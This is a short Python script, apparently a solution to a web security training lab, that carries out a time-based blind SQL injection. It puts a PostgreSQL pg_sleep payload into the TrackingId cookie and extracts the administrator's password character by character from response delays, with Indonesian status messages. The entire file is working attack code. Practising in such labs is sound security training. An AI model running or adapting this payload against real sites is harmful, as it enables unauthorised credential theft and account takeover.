import requests
import time

headers = {
    "Sec-Ch-Ua": '"Chromium";v="129", "Not=A?Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0abd005303195b35826ba63c0093009c.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

url = "https://0abd005303195b35826ba63c0093009c.web-security-academy.net/product"
params = {'productId': '2'}
total_time = 0

password = ""
print("Brute Forcing 20 kali...")
for i in range(1, 21):
    print("Brute Force password ke", i)
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        start_time = time.time()
        cookies = {
            'TrackingId': f"NbOVuBL0HFCsBbjK' || (select case when (username='administrator' and substring(password,{i},1)='{char}') then pg_sleep(5) else pg_sleep(-1) end from users)--",
            'session': "5Jtaj3K3ZxgQKQZiFsJPfLHyn6pReuIv"
        }
        response = requests.get(url, headers=headers, params=params, cookies=cookies)
        
        elapsed_time = time.time() - start_time
        
        if response.status_code == 200 and elapsed_time > 5:
            password += char
            print(f"Found Password huruf ke {i} adalah {char}")
            break

print(f"Password adalah {password}")

